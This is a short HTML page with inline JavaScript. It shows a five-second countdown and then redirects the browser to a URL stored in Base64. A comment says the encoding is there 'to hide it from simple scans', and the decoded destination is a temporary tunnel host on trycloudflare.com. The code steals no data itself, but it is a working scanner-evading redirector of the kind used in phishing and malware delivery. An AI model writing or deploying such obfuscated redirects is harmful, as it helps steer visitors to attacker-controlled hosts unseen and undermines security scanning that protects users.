    <div id="timer">Redirecting in <span id="countdown">5</span> seconds...</div>
    <script>
        // --- EDIT THIS LINE ---
        // The URL is encoded in Base64 to hide it from simple scans.
        // This is the encoded URL for: https://men-firmware-guests-silly.trycloudflare.com
        const encodedUrl = 'aHR0cHM6Ly9tZW4tZmlybXdhcmUtZ3Vlc3RzLXNpbGx5LnRyeWNsb3VkZmxhcmUuY29t';
        // ---------------------

        const destinationUrl = atob(encodedUrl); // Decodes the Base64 string back to a normal URL
        const delayInSeconds = 5;

        // Get the countdown span element
        const countdownElement = document.getElementById('countdown');

        // Set the initial countdown value
        let secondsLeft = delayInSeconds;
        countdownElement.textContent = secondsLeft;

        // Create an interval to update the countdown every second
        const countdownInterval = setInterval(() => {
            secondsLeft--;
            countdownElement.textContent = secondsLeft;

            // If the countdown reaches 0, clear the interval and redirect
            if (secondsLeft <= 0) {
                clearInterval(countdownInterval);
                window.location.href = destinationUrl;
            }
        }, 1000); // 1000 milliseconds = 1 second
    </script>
